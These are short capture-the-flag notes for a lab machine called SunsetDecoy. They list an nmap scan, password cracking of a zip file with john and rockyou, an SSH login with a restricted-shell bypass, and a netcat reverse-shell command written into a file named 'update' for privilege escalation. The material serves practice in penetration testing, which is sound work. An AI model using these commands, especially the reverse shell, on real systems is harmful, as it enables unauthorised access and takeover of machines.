----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# SunsetDecoy
# 11/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38


zip2john save.zip > hash   
 john -w=/usr/share/wordlists/rockyou.txt hash   
 manuel           (save.zip)     
server           (296640a3b825115a47b68fc44501c828)
ssh 296640a3b825115a47b68fc44501c828@192.168.157.85 -t "bash --noprofile"
/usr/bin/cat local.txt


./honeypot.decoy
->5

echo “/usr/bin/nc 192.168.45.5 4444 -e /bin/sh” > update

/usr/bin/ps aux
